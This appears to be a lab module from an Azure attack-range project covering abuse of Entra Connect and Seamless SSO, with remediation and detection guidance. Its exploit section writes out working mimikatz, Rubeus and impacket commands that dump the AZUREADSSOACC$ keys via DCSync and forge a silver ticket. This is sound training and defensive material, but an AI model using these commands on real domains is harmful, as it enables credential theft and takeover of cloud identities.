# AP06 — Entra Connect / Seamless SSO (AZUREADSSOACC$): the on-prem -> cloud bridge

**Layer:** Hybrid — on-prem AD DS + Microsoft Entra ID (Seamless SSO / Entra Connect) on the **same** Windows DC as AP05 (`hybrid-ad` module, shared substrate via `local.need_dc`)  
**Cost:** a **compute** path — **tied with AP05** as the path that bills an always-on Windows VM. AP06 **reuses the AP05 DC**: with `enable_ap05 = true` already active, AP06 adds **zero compute** (EUR 0/month incremental, it shares the same VM); with AP05 off, AP06 **stands that single DC up on its own** and bills the same as AP05 (`Standard_B2ms` ~EUR 0.083/h, ~EUR 60/month 24x7; `Standard_B2s` as a floor ~EUR 30/month; StandardSSD 127 GiB disk ~EUR 8-10/month; Standard public IP ~EUR 3-4/month; Log Analytics ingestion with the filtered hybrid feed, a few EUR/month). With **auto-shutdown** (2200) and ~8 h/day of use it drops to ~1/3 -> roughly **~EUR 20-40/month**; `./azrange.ps1 destroy` takes it to 0. It is neither "more expensive" nor "cheaper" than AP05: it is the **same** compute spend, shared. (West Europe, pay-as-you-go — verify the current price.)  
**MITRE ATT&CK:** [T1552](https://attack.mitre.org/techniques/T1552/) (Unsecured Credentials — *the Entra Connect sync-account credential with DCSync rights*) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync — *extract the Kerberos keys of AZUREADSSOACC$*) · [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Steal or Forge Kerberos Tickets: Silver Ticket — *forge the Seamless SSO TGS*) · [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material — *the forged ticket authenticates to the **cloud***)  
**Maps to cert:** CARTE / CRTE (hybrid identity; Entra Connect + Seamless SSO abuse; DCSync + Kerberos forging; adjacent defensive side: SC-200 / Microsoft Defender for Identity)  
**Precondition seeded by the range** (`enable_ap06 = true`; `sso_mode` defaults to `"both"`): on the hybrid DC shared with AP05, `scripts/seed-ap06.ps1` (via `az vm run-command` in the `deploy`, an exact mirror of `seed-ap05.ps1`) creates (a) the **Seamless SSO machine account** `AZUREADSSOACC$` with the SPNs `HTTP/autologon.microsoftazuread-sso.com` and `HTTP/aadg.windows.net.nsatc.net` and a **fixed/known** password (it lands in state, sensitive output `ap06_sso_password`) whose RC4 key is therefore reproducible and **which no entity will ever rotate**; and (b) the **sync account** `Sync_AZRANGE` (analogous to `MSOL_`/`Sync_`) with a known password and the **DCSync ACEs** (`DS-Replication-Get-Changes` + `-All`) over the *domain NC*. **What is NOT seeded:** no Domain Admin credential and no real tenant — AP06 does **not** sync with a real Entra; the cloud leg is **declared out of scope** (see 🔵). Auditing of the new EventIDs (4662/4769/4741/4742) is enabled by **the seed itself** (not the base AP05 DSC -> AP05 stays intact).

---

## 🎯 Learning objective

For the student to internalize the lesson that **closes the catalog** and sets it apart from everything before it: **an on-prem compromise does not stay on-prem**. AP05 ends in *DCSync* — full takeover of the Active Directory domain. AP06 uses that same *DCSync* **not as the destination, but as a stepping stone**: the key it extracts is not that of a forest user, it is that of the `AZUREADSSOACC$` account, whose Kerberos key is **shared with Microsoft Entra ID**. With it an attacker forges a ticket that **Entra validates as legitimate** -> the attacker jumps from the on-prem Active Directory to the **cloud identity** without ever touching a cloud password or the Azure portal.

The conceptual axis is a structural weakness, not a one-off misconfiguration: **the password of `AZUREADSSOACC$` is never rotated by default.** Ordinary machine accounts rotate their key every ~30 days; `AZUREADSSOACC$` **has no host to rotate it** — it is a service account that Entra Connect creates once and forgets — so its hash, stolen **just once**, is valid **forever**. That turns a one-time theft into **permanent persistence into the cloud**: immune to user password changes, to resets, to MFA on the human side. The ticket is forged *offline* with the stolen key; Entra cannot tell that forged TGS from a legitimate one because both are encrypted with the **same** `AZUREADSSOACC$` key.

The AP06 chain links four techniques into a single **on-prem -> cloud** bridge:

1. **T1552 — the sync-account credential.** The starting point represents *"you have compromised the Entra Connect server and dumped the sync credential"*. The lab seeds it (`Sync_AZRANGE`) with a known password and **DCSync** rights over the domain: it is the attacker's bootstrap primitive.
2. **T1003.006 — DCSync of `AZUREADSSOACC$`.** With that credential the attacker replicates from the DC the Kerberos keys (RC4/NT + AES) of the Seamless SSO account.
3. **T1558.001 — silver ticket.** With the `AZUREADSSOACC$` key the attacker forges a TGS for `HTTP/autologon.microsoftazuread-sso.com` **impersonating any synchronized user**, including a privileged one.
4. **T1550 — use in the cloud.** That TGS authenticates to Entra as the impersonated user **without their password** -> the on-prem -> cloud jump is complete, and the non-rotated key guarantees it can be repeated indefinitely.

Break **any** link (rotate the `AZUREADSSOACC$` key, remove DCSync from the sync account, harden the Entra Connect server) and the path dies: that is why the 🟢 section offers several independent cuts.

**Contrast with AP05 (same hybrid layer, same DC).** AP05 and AP06 share substrate — a single Windows DC on Azure IaaS — and share the *DCSync* verb, but the lesson is the **opposite**: AP05 is pure on-prem AD CS and **ends on-prem** (forest takeover via forged certificate + PKINIT); AP06 treats DCSync as the **means** to extract a key that **straddles both worlds** and **jumps to Entra**. Where AP05 teaches "a misconfigured template = domain takeover", AP06 teaches "an SSO service account with a non-rotated key = a permanent bridge from the on-prem AD to your tenant". It is also the range's **second hybrid path** and the one that **closes** it.

---

## 🔴 Exploit (how it is exploited)

> Authorized training lab, your own test tenant/subscription. The `azrange.lab` forest is **isolated** and does **not** sync with any real tenant: AP06 **simulates** the on-prem Entra Connect / Seamless SSO surface (the `AZUREADSSOACC$` account and the sync account) to exercise the theft-and-forge chain; effective validation against `login.microsoftonline.com` is **out of scope** (see the declared boundary in 🔵). Every step starts from the `Sync_AZRANGE` sync-account credential (what the range hands over as "you have already compromised the Entra Connect server").

The canonical chain is `sync cred -> DCSync of AZUREADSSOACC$ -> silver ticket for the Seamless SSO SPN -> auth to the cloud`. As in AP05, the range covers **two network postures** depending on what the operator opens in the NSG.

### Path A — native Windows over RDP (primary UX, no AD ports exposed)

The module's NSG does **not** open LDAP/Kerberos/RPC to the Internet. The intended route is RDP to the DC (from `admin_source_cidr`) and running the Windows-native tools. Reference: **mimikatz** (`lsadump::dcsync` + `kerberos::golden` in silver mode) and **Rubeus** (GhostPack).

```powershell
# RDP to <ap06_dc_public_ip> (source = admin_source_cidr)

# 1. DCSync of AZUREADSSOACC$ using the compromised sync credential.
#    (mimikatz running under a context presenting the Sync_AZRANGE cred:
#     runas /netonly, or pass its keys via a prior pass-the-hash.)
.\mimikatz.exe "lsadump::dcsync /domain:azrange.lab /user:AZUREADSSOACC$" exit
#   -> copy the NTLM (RC4 key) and the AES128/AES256 keys of AZUREADSSOACC$
#     NOTE: AZUREADSSOACC$ ends in '$' (it is a MACHINE account, not a user).

# 2. Find the domain SID and the UPN of the (synchronized) user to impersonate.
#    The Seamless SSO silver ticket impersonates a tenant user by their on-prem identity.
whoami /user   # or Get-ADDomain for the domain base SID

# 3. Forge the SILVER TICKET for the Seamless SSO SPN with the stolen RC4 key.
#    target = autologon.microsoftazuread-sso.com ; service = HTTP ; rc4 = NTLM of AZUREADSSOACC$
.\mimikatz.exe "kerberos::golden /user:<user_to_impersonate> /domain:azrange.lab ^
  /sid:<domain_SID> /target:autologon.microsoftazuread-sso.com ^
  /service:HTTP /rc4:<NTLM_of_AZUREADSSOACC$> /ptt" exit
#   (equivalent with Rubeus: `Rubeus.exe silver /service:HTTP/autologon.microsoftazuread-sso.com
#    /rc4:<NTLM> /user:<user> /domain:azrange.lab /sid:<SID> /ptt`)

# 4. Use the forged TGS to authenticate to Entra (cloud leg: OUTSIDE the lab).
#    In a real environment, the client would present this ticket to the Seamless SSO endpoint
#    and Entra would validate it with the SAME AZUREADSSOACC$ key -> session as <user_to_impersonate>.
```

### Path B — remote with impacket / Rubeus (only if the operator opened the AD ports to `admin_source_cidr`)

If the operator relaxes the NSG to expose LDAP/Kerberos/RPC to its `/32`, the equivalent flow from a Linux attacker box with **impacket** (`secretsdump`) + **Rubeus**/**ticketer**:

```bash
# 1. DCSync of AZUREADSSOACC$ with the sync cred (DCSync seeded over the domain NC)
impacket-secretsdump 'azrange.lab/Sync_AZRANGE:<sync_pass>@<ap06_dc_public_ip>' \
  -just-dc-user 'AZRANGE/AZUREADSSOACC$'
#   -> aes256/aes128/NTLM of AZUREADSSOACC$

# 2. Forge the silver ticket for the Seamless SSO SPN (impacket-ticketer)
#    -nthash: the stolen RC4 key ; -spn: the autologon SPN ; -domain-sid: forest SID
impacket-ticketer -nthash '<NTLM_of_AZUREADSSOACC$>' \
  -domain-sid '<domain_SID>' -domain 'azrange.lab' \
  -spn 'HTTP/autologon.microsoftazuread-sso.com' '<user_to_impersonate>'
#   -> <user_to_impersonate>.ccache (the forged Seamless SSO TGS)

# 3. (Cloud leg — OUTSIDE the lab) present the ticket to Entra's Seamless SSO endpoint.
```

> **Caveat — RC4 yes, precomputed AES no.** The **RC4/NT** key of `AZUREADSSOACC$` is *deterministic* from the known password: `RC4 = MD4(UTF16LE(password))`. The **AES128/AES256** keys, by contrast, are derived with a *salt* that includes the *realm* and the account (host) name, so they are **not** trivial to precompute across domains. That is why the forge uses the **RC4** key (`/rc4`, `-nthash`), or else the **AES keys that DCSync itself returns** (already salted correctly by the DC). Do **not** try to seed or precompute a fixed AES key: use RC4 for the fast forge or the AES keys obtained in the DCSync step.

> **Caveat — a silver ticket forged *offline* does not always touch the DC.** The TGS is manufactured with the stolen key **without asking the KDC**, so the `4769` event (TGS Request) often **does not appear** on the DC during the attack. This is *load-bearing* for detection (see 🔵): the `4769` is a *hunt/booster*, never a *gate*. The reliable fingerprint of the attack is the **DCSync `4662`** on `AZUREADSSOACC$`, not the `4769`.

> **Caveat — `AZUREADSSOACC` is a MACHINE account.** `sAMAccountName = AZUREADSSOACC$` (with `$`), a *computer* object, with the two Seamless SSO SPNs set at creation time. It is not a user. If it is seeded or searched for as a user, both detection and forge fail.

> **Caveat — propagation / auto-shutdown.** Run `deploy` + attack in the same session: a VM *deallocated* by auto-shutdown (2200) serves neither RDP nor `az vm run-command`, and the DCPromo + seed take time to become ready after the first `apply` (the AP06 seed runs *post-apply*, like the AP05 one).

### Variants — `sso_mode`

The `sso_mode` variable (analogous to `leak_mode`/`runbook_mode`) decides **which artifacts** the lab seeds, and therefore **which segment** of the chain is exercised:

| `sso_mode` | What is seeded | Scoped lesson |
|---|---|---|
| `silver_ticket` | Only `AZUREADSSOACC$` (fixed non-rotated key + SPN) | Focus on **forging** the Seamless SSO TGS (assumes you already have the key) |
| `sync_dcsync` | Only the sync account `Sync_AZRANGE` with the **DCSync** ACE over the NC | Focus on **extracting** the Entra Connect credential -> DCSync |
| `both` *(default)* | Both artifacts | **Full chain** sync -> DCSync -> `AZUREADSSOACC$` keys -> silver ticket -> cloud |

The `both` default is the only one that honors AP06's **complete MITRE map** (T1552 + T1003.006 + T1558.001 + T1550). `silver_ticket` and `sync_dcsync` are **idempotent subsets** of `both` for more scoped shared deployments or targeted lessons.

### Jump to the cloud

With the Seamless SSO silver ticket the attacker authenticates to Entra **as the impersonated user** (if it is a synchronized user with a privileged role in the tenant, they inherit that privilege in the cloud). The on-prem compromise has **jumped** to the cloud identity, and — crucially — the **non-rotated key** of `AZUREADSSOACC$` turns that jump into **persistence**: as long as that key is not rotated, the attacker can re-forge tickets and re-enter the cloud indefinitely, regardless of how many times users change their passwords.

---

## 🟢 Remediate (remediation)

Each of these actions **cuts the bridge on its own**. Apply them in depth — any of the first three breaks the chain independently (just as in AP05 every cut kills ESC1).

1. **Rotate the Kerberos key of `AZUREADSSOACC$` — TWICE (the direct antidote).** This is Microsoft's official fix: *rolling the Seamless SSO decryption key twice* invalidates (a) any already-stolen hash and (b) any **already-forged** silver ticket. The double rotation is necessary because Kerberos retains the previous key (N-1) to validate in-flight tickets; rotating only once would leave the stolen key valid for one more window. In the range, `scripts/seed-ap06.ps1 -Remediate` runs `Set-ADAccountPassword -Identity 'AZUREADSSOACC$' -Reset` **twice** with a fresh random password. In production, the procedure is the Seamless SSO decryption-key *rollover* of **Azure AD Connect** (not a simple manual reset).

2. **Remove the DCSync rights of the sync account.** Removing the `DS-Replication-Get-Changes` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) ACEs from `Sync_AZRANGE` over the *domain NC* cuts the ability to **re-extract** the `AZUREADSSOACC$` keys. Both ACEs are required for a working DCSync, so removing **either** one already breaks the primitive.

3. **Harden / retire the sync account and its server (treat Entra Connect as *tier-0*).** Disable or delete the compromised `MSOL_`/`Sync_` account and harden the Entra Connect server (it is, de facto, a DC-tier system: it custodies a credential with DCSync). In the lab, `-Remediate` runs `Disable-ADAccount`/`Remove-ADUser` on the sync account.

4. **Monitor `4662` on `AZUREADSSOACC$` (defense in depth / detection as a control).** An alert on the DCSync of `AZUREADSSOACC$` by an account other than the legitimate sync one detects the attack at its **most reliable** step (see 🔵). Complement with PHS/PTA hygiene and, if Seamless SSO is operated, with a periodic *rollover* of its decryption key.

> **AP06's remediation lesson (a mirror of AP05).** There is no "single patch": there are **several independent cuts**, and robust defense applies more than one. The difference from AP05 is *where* each one cuts — here you do not neutralize a template, you **break the bridge** between the on-prem AD and the cloud tenant.

### In-place remediation in the range (the "Remediate" exercise)

`scripts/seed-ap06.ps1 -Remediate` fixes the AP06 artifacts **while leaving the DC/telemetry standing**, so the student can re-run the attack and the detection against the corrected state and confirm that the silver ticket can no longer be re-forged (key rotated) nor the sync account re-extract keys (DCSync removed). It applies the three cuts at once: (A) rotates the `AZUREADSSOACC$` key **twice**; (B) removes the two replication ACEs from the sync account over the NC (with the same *gotcha* of the **binary form** of `nTSecurityDescriptor` that `seed-ap05.ps1` documents — you must write with `Set-ADObject -Replace @{ nTSecurityDescriptor = $sd.GetSecurityDescriptorBinaryForm() }`, not pass the security object directly); (C) disables/deletes the sync account. Each branch *early-returns* if the object does not exist (idempotent, re-runnable). Symmetric invocation with the `deploy` seed:

```bash
az vm run-command invoke \
  -g <ap06_resource_group> -n <ap06_dc_vm_name> \
  --command-id RunPowerShellScript \
  --scripts @scripts/seed-ap06.ps1 \
  --parameters Remediate=true EaPassword='<ap06_dc_admin_password>' \
               DomainFqdn=azrange.lab DomainNetbios=AZRANGE \
               SsoAccountName=AZUREADSSOACC SyncAccountName=Sync_AZRANGE
```

> **Two levels of reset — do not confuse them (and MIND the selective case, inherent to the shared substrate).**
>
> **(1) Hard / cost->0:** `./azrange.ps1 reset` re-applies with `enable_ap06 = false` **and** `enable_ap05 = false`. Only when **both** flags are `false` does `local.need_dc` evaluate to `false` (`count = 0`) -> Terraform **destroys the single shared DC** and with it, atomically, `AZUREADSSOACC$`, the sync account and the DCSync ACEs of the NC (they live in the **directory** of the destroyed DC, **not** in the `tfstate`) -> a reset with no *out-of-state* residue, zero cost afterward. It is the same cleanup property that AP05/AP07/AP08 advertise (AP06 **shares** it, it does not claim it exclusively). That is why `reset` **must** include `-var enable_ap06=false` alongside the existing `enable_ap05=false`: with the shared DC, forgetting the AP06 flag would leave the DC standing.
>
> **(2) In-place / pedagogical:** `seed-ap06.ps1 -Remediate` (above). As in AP05, `./azrange.ps1 reset` does **not** pre-remediate AP06 via `run-command` (the vuln lives in the destroyable VM, which may also be *deallocated* by auto-shutdown and would make the `run-command` fail).
>
> **Selective case — the trap of the shared substrate.** Turning off **only** AP06 (`enable_ap06=false` with `enable_ap05=true`) leaves `need_dc = true` -> **the DC survives** and AP06's AD objects (`AZUREADSSOACC$`, the sync account) **persist**, because they are not Terraform resources. For "Remediate" in that case you **must** run `seed-ap06.ps1 -Remediate` **before** lowering the flag. Terraform destroys the DC only when **both** flags fall.

---

## 🔵 Detect

The source is **Windows Security events** from the hybrid DC (on-prem — like AP05, there are **no** cloud logs inside the lab). AP06 **reuses the pipeline that already exists for AP05**: **Azure Monitor Agent (AMA)** + **Data Collection Rule (DCR)** + **Log Analytics**, with the DCR xPath filter **extended only when `enable_ap06 = true`** to add the AP06 EventIDs **without altering** the AP05 filter (which stays byte-for-byte identical when AP06 is off). KQL table: **`SecurityEvent`**.

- KQL (Sentinel / Defender XDR): [`../../detections/kql/AP06-entra-connect-seamless-sso.kql`](../../detections/kql/AP06-entra-connect-seamless-sso.kql)
- Sigma: [`../../detections/sigma/AP06-entra-connect-seamless-sso.yml`](../../detections/sigma/AP06-entra-connect-seamless-sso.yml)

**Signals (table `SecurityEvent`):**

| Signal | EventID | What to look at |
|---|---|---|
| **DCSync of `AZUREADSSOACC$`** (the star) | `4662` | `Properties` contains the GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (`DS-Replication-Get-Changes`) and/or `1131f6ad-...` (`-All`); `SubjectUserName` = the sync account, over the NC / `AZUREADSSOACC$`. **It is the reliable signature of the attack.** |
| TGS for the Seamless SSO SPN (*hunt*) | `4769` | `ServiceName` = `AZUREADSSOACC$` or `HTTP/autologon.microsoftazuread-sso.com`; interest in `TicketEncryptionType = 0x17` (RC4). **Strong caveat: a silver ticket forged *offline* does NOT always generate `4769`** -> *hunt/booster*, **never** a *gate*. |
| Creation / change of `AZUREADSSOACC$` | `4741` / `4742` | `TargetUserName` contains `AZUREADSSOACC` — the defender **sees the Seamless SSO account being planted** (mirror of `4899/4900` in AP05) |
| `AZUREADSSOACC$` with an **old** `PasswordLastSet` (*property hunt*) | — | **Not event-driven**: requires a periodic LDAP query. A Seamless SSO account whose key never changes = the *tell* of non-rotation. A declared complement, not a `SecurityEvent` signal. |

**Indispensable prerequisite (enabled by `seed-ap06.ps1`, NOT the base AP05 DSC -> AP05 intact):** `auditpol /set` of the *Directory Service Access* (Success+Failure, for `4662`), *Kerberos Service Ticket Operations* (Success, for `4769`) and *Computer Account Management* (Success, for `4741/4742`) subcategories; and, so that the DCSync `4662` is actually recorded, an appropriate **SACL** on the *domain NC*. Without this, **the events are not generated** and detection fails on an empty set (the same audit-prerequisite lesson as AP05).

**Correlation logic (lesson from AP04/AP05/AP07): OR / `union`, never a global `inner join`.** The three signals are **independent** and fire on their own: (a) `4662` with the replication GUIDs by a sync account = the DCSync signature; (b) a `4769` for the Seamless SSO SPN; (c) a `4741/4742` on `AZUREADSSOACC$` outside an approved window. The KQL unites them with `union isfuzzy=true | sort by TimeGenerated asc`. A high-fidelity temporal correlation (DCSync `4662` on `AZUREADSSOACC$` => within a window => SSO SPN `4769`) is included **commented out**, precisely because the silver ticket may **not** produce `4769` — it never becomes an `AND` that silently discards the chain.

**False positives to *allowlist*:** the **legitimate Azure AD Connect synchronization** generates `4662` with those same replication GUIDs from its real sync account -> in production you *allowlist* the known sync account (in the lab, the DCSync of the seeded account **is** the signal). Legitimate Seamless SSO *sign-ins* are the expected `4769` *baseline* (hence it is a *hunt*). An approved *rollover* of the `AZUREADSSOACC$` key produces benign `4741/4742`.

> **Declared boundary — the CLOUD leg is NOT covered by the lab (an exact mirror of the boundaries AP05 declares).** Effective authentication to the cloud with the forged ticket would be seen in **Entra ID `SigninLogs`** (Seamless SSO sign-ins against `autologon.microsoftazuread-sso.com`) and/or `AADServicePrincipalSignInLogs`, but the range does **not** provision the tenant or a real Entra Connect -> **AP06 covers only the on-prem leg** (`SecurityEvent`). Just as AP05 declares there are no Entra `AuditLogs`/`SigninLogs`, AP06 declares it explicitly. **Managed complement:** **Microsoft Defender for Identity** brings **native** detection of *Suspected DCSync attack* and of *Suspected Golden/Silver Ticket* on sensor-equipped DCs — recommended alongside these rules; and, if a tenant exists, a companion KQL over `SigninLogs` would close the cloud leg.

> **`SecurityEvent` schema caveat.** The `4662` properties (the replication GUIDs) live in the `Properties`/`EventData` field (depending on how the pipeline promotes the XML fields); the `4769` may require extracting `ServiceName`/`TicketEncryptionType` from the XML if the DCR does not promote them. The KQL handles this with `contains` over `Properties`.

> **Ingestion cost.** The hybrid feed stays well below 0.1-0.3 GB/day -> a few EUR/month (31 days of retention included); AP06 **adds** 4 EventIDs to the AP05 filter only when active. **Always** filter the DCR xPath to those EventIDs: an unfiltered *Security* channel triggers the Log Analytics cost. It is disabled with `collect_security_events = false` or by pointing at an external workspace.

---

## 📚 References

- Dirk-jan Mollema (*dirkjanm*) — *Updating adconnectdump* / analysis of Seamless SSO and `AZUREADSSOACC$` (the key shared with Entra and its non-rotation): [dirkjanm.io](https://dirkjanm.io/) · *Abusing Azure AD SSO with the Primary Refresh Token* (hybrid-identity context)
- Microsoft — [Azure AD Connect: Seamless Single Sign-On — FAQ and *key rollover*](https://learn.microsoft.com/entra/identity/hybrid/connect/how-to-connect-sso) (official *rollover* procedure for the Seamless SSO decryption key; the `AZUREADSSOACC$` account)
- Microsoft — [Microsoft Defender for Identity](https://learn.microsoft.com/defender-for-identity/) (*Suspected DCSync attack*, *Suspected Golden/Silver Ticket* — managed detection on the DC)
- SpecterOps / HarmJ0y — *Kerberoasting* and *forging silver tickets* (technical basis of the TGS forged with a service key)
- Tools: **mimikatz** (`lsadump::dcsync`, `kerberos::golden` in silver mode), **Rubeus** (`silver`/`asktgt`), **impacket** (`secretsdump`, `ticketer`), **BloodHound** (sync/DCSync edges), **AADInternals** (Seamless SSO / `AZUREADSSOACC$`-specific tooling)
- MITRE ATT&CK — [T1552](https://attack.mitre.org/techniques/T1552/), [T1003.006](https://attack.mitre.org/techniques/T1003/006/), [T1558.001](https://attack.mitre.org/techniques/T1558/001/), [T1550](https://attack.mitre.org/techniques/T1550/)
- Compare with [AP05](./AP05-adcs-esc1.md) — **same hybrid DC, same compute layer** (AP06 reuses the AP05 substrate; both bill the VM). AP05 **ends** in on-prem DCSync; AP06 uses the DCSync as a **stepping stone** to jump to Entra (on-prem -> cloud). AP06 **closes the catalog** and is the range's **2nd hybrid path**.
